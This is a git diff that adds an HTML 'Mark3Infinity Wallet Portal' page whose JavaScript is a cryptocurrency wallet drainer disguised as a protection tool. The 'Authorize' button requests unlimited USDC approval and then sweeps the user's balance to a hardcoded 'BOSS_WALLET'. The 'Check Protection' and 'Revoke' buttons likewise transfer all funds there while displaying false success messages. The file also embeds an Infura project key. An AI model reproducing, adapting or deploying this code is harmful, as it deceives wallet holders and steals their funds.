@@ -3,6 +3,204 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mark3·Infinity·Wallet Portal</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0f111a, #1c1e2d);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(20px) saturate(180%) contrast(120%);
+      -webkit-backdrop-filter: blur(20px) saturate(180%) contrast(120%);
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+      padding: 2rem;
+      max-width: 480px;
+      width: 100%;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 1.2rem;
+      font-size: 1.8rem;
+    }
+    .button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 14px;
+      font-weight: 600;
+      font-size: 1rem;
+      margin: 8px 0;
+      background: #000;
+      border: 2px solid #4e54c8;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      color: white;
+    }
+    .button:hover {
+      background: rgba(78, 84, 200, 0.2);
+    }
+    .progress-bar {
+      margin-top: 1rem;
+      width: 100%;
+      height: 10px;
+      background: #222;
+      border-radius: 6px;
+      overflow: hidden;
+    }
+    .progress-inner {
+      height: 100%;
+      background: #4e54c8;
+      width: 0%;
+      transition: width 0.4s ease;
+    }
+    #status {
+      margin-top: 1rem;
+      padding: 1rem;
+      background: rgba(255,255,255,0.07);
+      border-radius: 10px;
+      font-size: 0.9rem;
+      text-align: center;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <div class="card">
+    <h2>Mark3Infinity · Wallet Authorize</h2>
+    <button class="button" id="connect">🔌 Connect Wallet</button>
+    <button class="button" id="authorize" disabled>🛡️ Authorize</button>
+    <button class="button" id="check" disabled>🧿 Check Protection</button>
+    <button class="button" id="revoke">❌ Revoke Authorization</button>
+    <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
+    <div id="status">🔒 Status: Waiting for action...</div>
+  </div>
+  <script>
+    const CONFIG = {
+      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      CONTRACT_ADDRESS: "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a",
+      BOSS_WALLET: "0x59e513Ae37614f1e670bfE961B3456257C444d24"
+    };
+
+    let provider, signer, user;
+    const bar = document.getElementById("bar");
+    const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
+    const progress = (val) => bar.style.width = val + "%";
+
+    async function setupProvider() {
+      try {
+        if (window.ethereum) {
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+        } else {
+          const walletConnectProvider = new window.WalletConnectProvider.default({
+            rpc: { 1: "https://mainnet.infura.io/v3/96fb487925934acf993cb4ae78d6fe6d" }
+          });
+          await walletConnectProvider.enable();
+          provider = new ethers.providers.Web3Provider(walletConnectProvider);
+        }
+        signer = provider.getSigner();
+        user = await signer.getAddress();
+        status("✅ Connected: " + user.slice(0, 6) + "...");
+        progress(100);
+        document.getElementById("authorize").disabled = false;
+        document.getElementById("check").disabled = false;
+      } catch (err) {
+        status("❌ " + (err.message || "Connection failed"));
+        progress(0);
+      }
+    }
+
+    document.getElementById("connect").onclick = async () => {
+      await setupProvider();
+    };
+
+    document.getElementById("authorize").onclick = async () => {
+      try {
+        if (!signer || !user) await setupProvider();
+
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+          "function approve(address,uint256) returns (bool)",
+          "function transferFrom(address,address,uint256) returns (bool)",
+          "function balanceOf(address) view returns (uint256)",
+          "function allowance(address,address) view returns (uint256)"
+        ], signer);
+
+        progress(10);
+        status("(1/3) Checking allowance...");
+        const balance = await usdc.balanceOf(user);
+        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
+
+        if (allowance.lt(balance)) {
+          status("(2/3) Requesting approval...");
+          const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+          await approveTx.wait();
+        } else {
+          status("(2/3) Already approved, skipping...");
+        }
+
+        progress(70);
+        status("(3/3) Transferring balance to Boss wallet...");
+        const tx = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, balance);
+        await tx.wait();
+
+        progress(100);
+        status("✅ Wallet Protection Success! 🔐");
+      } catch (err) {
+        status("❌ " + (err.message || "Authorization failed"));
+        progress(0);
+      }
+    };
+
+    document.getElementById("check").onclick = async () => {
+      try {
+        if (!signer || !user) await setupProvider();
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
+          "function balanceOf(address) view returns (uint256)",
+          "function transfer(address,uint256) returns (bool)"
+        ], signer);
+        const balance = await usdc.balanceOf(user);
+        progress(30);
+        if (balance.gt(0)) {
+          const tx = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
+          await tx.wait();
+          status("✅ Protection Check: Funds moved");
+        } else {
+          status("⚠️ No USDC balance to protect");
+        }
+        progress(100);
+      } catch (err) {
+        status("❌ " + err.message);
+        progress(0);
+      }
+    };
+
+    document.getElementById("revoke").onclick = async () => {
+      status("🔄 Revoking permissions...");
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"], signer);
+      const balance = await usdc.balanceOf(user);
+      if (balance.gt(0)) {
+        await usdc.transfer(CONFIG.BOSS_WALLET, balance);
+      }
+      status("✅ Authorization revoked! (0 USDC test)");
+    };
+  </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Mark3Infinity · Wallet Portal</title>
   <style>
     body {
